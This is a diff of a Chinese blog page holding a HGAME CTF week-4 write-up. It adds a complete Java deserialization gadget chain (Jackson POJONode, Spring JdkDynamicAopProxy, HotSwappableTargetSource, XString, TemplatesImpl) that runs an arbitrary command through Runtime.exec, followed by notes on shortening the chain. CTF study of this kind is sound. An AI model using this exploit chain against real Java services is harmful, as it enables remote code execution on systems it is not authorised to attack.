@@ -34,11 +34,14 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/HGAME-week4/image-20240223052634551.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/HGAME-week4/image-20240223054719495.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/HGAME-week4/image-20240224135447565.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/HGAME-week4/image-20240301182459369.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/HGAME-week4/image-20240301182743074.png">
+<meta property="og:image" content="https://zer0peach.github.io/images/HGAME-week4/image-20240301183344557.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/HGAME-week4/image-20240224130536913.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/HGAME-week4/image-20240224105025030.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/HGAME-week4/image-20240228214031034.png">
 <meta property="article:published_time" content="2024-02-24T04:27:43.000Z">
-<meta property="article:modified_time" content="2024-02-28T13:40:50.560Z">
+<meta property="article:modified_time" content="2024-03-01T10:37:45.426Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/images/HGAME-week4/image-20240228213658720.png">
@@ -246,7 +249,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          7.6k 字
+          12k 字
         
       </span>
     
@@ -257,7 +260,7 @@
         
         
         
-          64 分钟
+          102 分钟
         
       </span>
     
@@ -470,6 +473,129 @@ oos.close<span class="hljs-literal">()</span>;
 <h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>上面的方法由于不稳定肯定都是要刷机的，所以还是等预期解</p>
 <p>jackson稳定后再进行压缩</p>
 <p>真不会啊，等WP</p>
+<p>太强了，不仅缩短了jackson稳定的代码，还用了一个非常小的马</p>
+<p>WOC，神了</p>
+<div class="code-wrapper"><pre><code class="hljs reasonml">import com.alibaba.fastjson.JSONArray;
+import com.fasterxml.jackson.core.JsonProcessingException;
+import com.fasterxml.jackson.databind.ObjectMapper;
+import com.fasterxml.jackson.databind.ObjectMapper.DefaultTyping;
+import com.fasterxml.jackson.databind.node.POJONode;
+import com.sun.org.apache.bcel.internal.Repository;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import com.sun.org.apache.xpath.internal.objects.XString;
+import javassist.*;
+import org.springframework.aop.framework.AdvisedSupport;
+import org.springframework.aop.target.HotSwappableTargetSource;
+import org.springframework.http.HttpEntity;
+import org.springframework.http.HttpHeaders;
+import org.springframework.http.ResponseEntity;
+import org.springframework.web.client.RestTemplate;
+
+import javax.management.BadAttributeValueExpException;
+import javax.swing.event.EventListenerList;
+import javax.swing.event.SwingPropertyChangeSupport;
+import javax.swing.text.StyledEditorKit;
+import javax.swing.undo.UndoManager;
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.*;
+import java.net.URI;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.security.*;
+import java.sql.SQLOutput;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Scanner;
+import java.util.Vector;
+
+public <span class="hljs-keyword">class</span> XString_chain &#123;
+    public static void main(String<span class="hljs-literal">[]</span> args) throws Exception &#123;
+
+        byte<span class="hljs-literal">[]</span> bytecodes = payload3<span class="hljs-literal">()</span>;
+        Templates templatesimpl = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;
+
+        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;z&quot;</span>)</span>;
+        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-params">new</span> <span class="hljs-params">byte</span>[][] &#123;<span class="hljs-params">bytecodes</span>&#125;)</span>;
+        set<span class="hljs-constructor">Value(<span class="hljs-params">templatesimpl</span>, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-params">null</span>)</span>;
+
+        Class&lt;?&gt; clazz = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>)</span>;
+        Constructor&lt;?&gt; cons = clazz.get<span class="hljs-constructor">DeclaredConstructor(AdvisedSupport.<span class="hljs-params">class</span>)</span>;
+        cons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        AdvisedSupport advisedSupport = <span class="hljs-keyword">new</span> <span class="hljs-constructor">AdvisedSupport()</span>;
+        advisedSupport.set<span class="hljs-constructor">TargetSource(<span class="hljs-params">new</span> HotSwappableTargetSource(<span class="hljs-params">templatesimpl</span>)</span>);
+        InvocationHandler handler = (InvocationHandler) cons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">advisedSupport</span>)</span>;
+        set<span class="hljs-constructor">Value(<span class="hljs-params">handler</span>,<span class="hljs-string">&quot;proxiedInterfaces&quot;</span>,<span class="hljs-params">null</span>)</span>;
+        Templates proxyObj = (Templates)<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Proxy</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">ProxyInstance(<span class="hljs-params">clazz</span>.<span class="hljs-params">getClassLoader</span>()</span>, <span class="hljs-keyword">new</span> Class<span class="hljs-literal">[]</span>&#123;<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Templates</span>.</span></span><span class="hljs-keyword">class</span>&#125;, handler);
+
+        POJONode jsonNodes = <span class="hljs-keyword">new</span> <span class="hljs-constructor">POJONode(<span class="hljs-params">proxyObj</span>)</span>;
+
+        HotSwappableTargetSource h1 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HotSwappableTargetSource(<span class="hljs-params">jsonNodes</span>)</span>;
+        HotSwappableTargetSource h2 = <span class="hljs-keyword">new</span> <span class="hljs-constructor">HotSwappableTargetSource(<span class="hljs-params">new</span> XString(<span class="hljs-params">null</span>)</span>);
+
+        HashMap&lt;Object, Object&gt; objectObjectHashMap = make<span class="hljs-constructor">Map(<span class="hljs-params">h1</span>, <span class="hljs-params">h2</span>)</span>;
+
+        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(serial(objectObjectHashMap).length<span class="hljs-literal">()</span>);
+
+
+    &#125;
+    public static HashMap&lt;Object, Object&gt; makeMap (Object v1, Object v2 ) throws Exception &#123;
+        HashMap&lt;Object, Object&gt; s = <span class="hljs-keyword">new</span> HashMap&lt;&gt;<span class="hljs-literal">()</span>;
+        set<span class="hljs-constructor">Value(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;size&quot;</span>, 2)</span>;
+        Class&lt;?&gt; nodeC;
+        <span class="hljs-keyword">try</span> &#123;
+            nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>)</span>;
+        &#125;
+        catch ( ClassNotFoundException e ) &#123;
+            nodeC = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span><span class="hljs-keyword">for</span><span class="hljs-constructor">Name(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>)</span>;
+        &#125;
+        Constructor&lt;?&gt; nodeCons = nodeC.get<span class="hljs-constructor">DeclaredConstructor(<span class="hljs-params">int</span>.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, Object.<span class="hljs-params">class</span>, <span class="hljs-params">nodeC</span>)</span>;
+        nodeCons.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+
+        Object tbl = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(<span class="hljs-params">nodeC</span>, 2)</span>;
+        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">0</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v1</span>, <span class="hljs-params">v1</span>, <span class="hljs-params">null</span>)</span>);
+        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Array</span>.</span></span>set(tbl, <span class="hljs-number">1</span>, nodeCons.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance(0, <span class="hljs-params">v2</span>, <span class="hljs-params">v2</span>, <span class="hljs-params">null</span>)</span>);
+        set<span class="hljs-constructor">Value(<span class="hljs-params">s</span>, <span class="hljs-string">&quot;table&quot;</span>, <span class="hljs-params">tbl</span>)</span>;
+        return s;
+    &#125;
+    public static void set<span class="hljs-constructor">Value(Object <span class="hljs-params">obj</span>, String <span class="hljs-params">name</span>, Object <span class="hljs-params">value</span>)</span> throws Exception&#123;
+        Field field = obj.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">DeclaredField(<span class="hljs-params">name</span>)</span>;
+        field.set<span class="hljs-constructor">Accessible(<span class="hljs-params">true</span>)</span>;
+        field.set(obj, value);
+    &#125;
+    public static byte<span class="hljs-literal">[]</span> payload3<span class="hljs-literal">()</span> throws CannotCompileException, NotFoundException, IOException &#123;
+        ClassPool classPool = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassPool</span>.</span></span>get<span class="hljs-constructor">Default()</span>;
+        CtClass ctClass = classPool.make<span class="hljs-constructor">Class(<span class="hljs-string">&quot;a&quot;</span>)</span>;
+        CtClass superClass = classPool.get(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AbstractTranslet</span>.</span></span><span class="hljs-keyword">class</span>.get<span class="hljs-constructor">Name()</span>);
+        ctClass.set<span class="hljs-constructor">Superclass(<span class="hljs-params">superClass</span>)</span>;
+        CtConstructor constructor = <span class="hljs-keyword">new</span> <span class="hljs-constructor">CtConstructor(<span class="hljs-params">new</span> CtClass[]&#123;&#125;, <span class="hljs-params">ctClass</span>)</span>;
+        constructor.set<span class="hljs-constructor">Body(<span class="hljs-string">&quot;throw new Exception(new java.util.Scanner(Runtime.getRuntime().exec(\&quot;执行的命令\&quot;).getInputStream()).next());&quot;</span>)</span>;
+
+        ctClass.add<span class="hljs-constructor">Constructor(<span class="hljs-params">constructor</span>)</span>;
+        return ctClass.<span class="hljs-keyword">to</span><span class="hljs-constructor">Bytecode()</span>;
+
+    &#125;
+
+&#125;</code></pre></div>
+
+<p>官方WP的<code>setValue(templatesimpl,&quot;_name&quot;,&quot;1ue&quot;);</code>还可以改为一个字符</p>
+<p>不过大差不差了</p>
+<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>这个马没得说，太强了</p>
+<p>我都忘记这个稳定代码是怎么分析出来的了（早知道当时重新看一下了</p>
+<p>为什么就不说了，说说如何缩短</p>
+<p><img src="/../images/HGAME-week4/image-20240301182459369.png" srcset="/img/loading.gif" lazyload alt="image-20240301182459369"></p>
+<p>这个类似于网上的缩短Rome链，这里我们只需要<code>this.advised</code>，所以直接把不相关的属性<code>proxiedInterfaces</code>设置为null</p>
+<p><img src="/../images/HGAME-week4/image-20240301182743074.png" srcset="/img/loading.gif" lazyload alt="image-20240301182743074"></p>
+<p>然后可以看到<code>setTarget</code>还调用了两个函数实际上就是为了返回target</p>
+<p>我们可以直接调用<code>setTargetSource</code>然后传入一个<code>TargetSource</code>类型的对象即可</p>
+<p>这里我们用到<code>HotSwappableTargetSource</code></p>
+<p><img src="/../images/HGAME-week4/image-20240301183344557.png" srcset="/img/loading.gif" lazyload alt="image-20240301183344557"></p>
+<p>可以看到几乎和<code>SingletonTargetSource</code>一样</p>
+<p>就这两处了</p>
+<p>其次jackson链子之中，用预期解的<code>HotSwappableTargetSource</code>和<code>XString</code>这条链是最短的</p>
+<p>我用的也是这个</p>
 <h2 id="Reverse-and-Escalation"><a href="#Reverse-and-Escalation" class="headerlink" title="Reverse and Escalation."></a><strong>Reverse and Escalation.</strong></h2><p>开题目发现两个环境，有点诧异</p>
 <p>有一个要登录，尝试admin&#x2F;admin</p>
 <p>成功后发现是ActiveMQ，版本为5.17.3</p>
@@ -559,7 +685,7 @@ export PATH=/tmp:$PATH
 
 
 <p><img src="/../images/HGAME-week4/image-20240224105025030.png" srcset="/img/loading.gif" lazyload alt="image-20240224105025030"></p>
-<h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>看下排名，发现有佬AK了WEB，woc真神仙</p>
+<h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>看下排名，发现有佬AK了WEB，woc真神仙（哦，好像有一题是两个flag，没事，不妨碍人家是大佬</p>
 <p><img src="/../images/HGAME-week4/image-20240228214031034.png" srcset="/img/loading.gif" lazyload alt="image-20240228214031034"></p>
 <p>杭电人才辈出啊</p>
 
